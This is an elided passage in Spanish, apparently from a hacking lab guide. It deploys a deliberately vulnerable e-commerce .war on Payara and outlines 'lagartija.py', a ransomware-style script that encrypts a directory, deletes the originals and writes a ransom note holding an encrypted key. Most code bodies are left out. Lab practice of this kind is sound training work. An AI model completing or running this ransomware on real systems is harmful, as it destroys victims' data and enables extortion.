...
9.  **Desplegar la aplicación `.war`:**
    ...
    * Haz clic en **Deploy...**.
    * Selecciona el archivo `.war` que se encuentra en la carpeta `config_ubuntu` del repositorio `HackingPayara` que clonaste ej. `HackingPayara/config_ubuntu/vulnerable_ecommerce.war`.
...
5.  **Crea el script `lagartija.py`:**
    ...
    TOTAL_SYSTEM_RAM_GB = 2 # la RAM real de tu Ubuntu
    CPU_LIMIT_PERCENT = 5 # 5% de CPU
    RAM_LIMIT_PERCENT = 10 # 10% de RAM
    ...
    def set_resource_limits():
        ...
        try:
            ...
            # print("Recordar ejecutar el script con sudo y que los cgroups estén configurados en el sistema.")
    ...
    def create_and_save_ransom_txt(encrypted_fernet_key_b64_for_txt, target_desktop_path):
        ...
        if not os.path.exists(target_desktop_path):
            try:
                ...
                #print("INFO: Intentando crear el archivo en /tmp/.")
        ...
        try:
            ...
            print(f"\nÉXITO: Archivo '{KEY_FILENAME}' creado en: {current_key_file_path} 😈")
            #print(f"INFO: Permisos de '{KEY_FILENAME}' establecidos a 0o644 (legible por todos).\n")
        except Exception as e:
            print(f"\nERROR FATAL: No se pudo crear el archivo de clave en '{current_key_file_path}': {e} 💥")
            sys.exit(1)
    ...
    def encrypt_directory(directory_path: str, target_desktop_path: str):
        ...
        print(f"\nIniciando cifrado y eliminación automática de originales. Total de archivos a procesar: {total_files_to_process} 😈")
        ...
        print(f"Revisa '{KEY_FILE_PATH}' para el mensaje de rescate.\n")
        #if failed_count > 0:
